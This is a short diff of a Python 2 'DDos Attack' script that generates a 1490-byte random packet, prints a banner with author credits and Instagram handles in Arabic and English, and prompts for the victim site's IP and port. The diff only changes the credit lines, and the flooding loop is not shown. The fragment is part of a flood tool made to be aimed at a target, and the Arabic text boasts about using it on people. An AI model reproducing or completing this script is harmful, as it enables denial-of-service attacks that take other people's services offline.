@@ -20,10 +20,10 @@ bytes = random._urandom(1490)
 os.system("clear")
 os.system("figlet DDos Attack")
 print
-print "برمجه محمد خليل   :يعني كافي هياط ششش"
-print "رجوع خفيف لطيف : كلمن يضم راسه لعون حمودي شمري "
-print "ديدوس   : باع عمري هاذ سكربت يحتوي ع هجمات ديدوس"
-print "انستا مالي:@bz7ii"
+print "Author   : SYKOO"
+print "DDOS : كسرت خشوم ع كم شخص لعيون حمودي شمري "
+print "instagrem   : @d_4g_"
+print "instagrem : @bz7ii"
 print
 ip = raw_input("IP مال موقع الضحيه : ")
 port = input("Port البورد      : ")
